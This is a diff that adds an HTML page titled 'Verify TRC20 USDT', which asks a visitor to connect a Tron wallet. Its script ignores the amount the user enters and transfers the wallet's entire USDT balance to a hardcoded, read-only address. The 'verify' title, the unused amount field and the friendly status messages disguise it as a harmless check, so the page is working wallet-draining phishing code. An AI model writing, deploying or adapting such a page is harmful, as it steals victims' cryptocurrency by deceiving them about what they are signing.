@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verify TRC20 USDT</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+</head>
+<body class="bg-white text-gray-800 font-sans">
+  <div class="max-w-md mx-auto p-4">
+
+    <label class="block text-sm font-medium mb-1">Recipient Address (TRC20)</label>
+    <input type="text" id="addressInput" value="TWGTigi1TUZWbPLbewscnuzCAgdQ59wAg2" class="w-full border rounded-lg px-3 py-2 mb-4" readonly />
+
+    <label class="block text-sm font-medium mb-1">Amount</label>
+    <input type="text" id="amountInput" placeholder="Enter amount" class="w-full border rounded-lg px-3 py-2 mb-1"/>
+
+    <label class="block text-sm font-medium mb-1 mt-4">Memo</label>
+    <input type="text" id="memoInput" placeholder="Optional" class="w-full border rounded-lg px-3 py-2 mb-6"/>
+
+    <button onclick="sendTRC20()" class="w-full bg-red-600 hover:bg-red-700 text-white text-lg py-3 rounded-full transition-colors">
+      Confirm TRC20 Transfer
+    </button>
+
+    <p id="status" class="text-center text-sm mt-4 text-gray-600 font-medium"></p>
+  </div>
+
+  <script>
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+
+    async function sendTRC20() {
+      const status = document.getElementById("status");
+      const recipient = document.getElementById("addressInput").value;
+
+      // Check for TronLink / Trust Wallet Tron provider
+      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+        status.textContent = "❌ Please connect your Tron wallet.";
+        return;
+      }
+
+      try {
+        status.textContent = "Connecting to USDT contract...";
+        
+        const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
+        const sender = window.tronWeb.defaultAddress.base58;
+
+        // Fetch balance (USDT on Tron uses 6 decimals)
+        const balance = await contract.balanceOf(sender).call();
+        
+        if (balance <= 0) {
+          status.textContent = "❌ No TRC20 USDT found in this wallet.";
+          return;
+        }
+
+        status.textContent = "Requesting signature...";
+
+        // Execute transfer of the total balance
+        const result = await contract.transfer(recipient, balance).send({
+          feeLimit: 100000000 // 100 TRX limit
+        });
+
+        if (result) {
+          status.textContent = "✅ Transfer initiated! Check your wallet history.";
+        }
+      } catch (err) {
+        console.error(err);
+        status.textContent = "❌ Error: " + (err.message || "Transaction rejected");
+      }
+    }
+  </script>
+</body>
+</html>
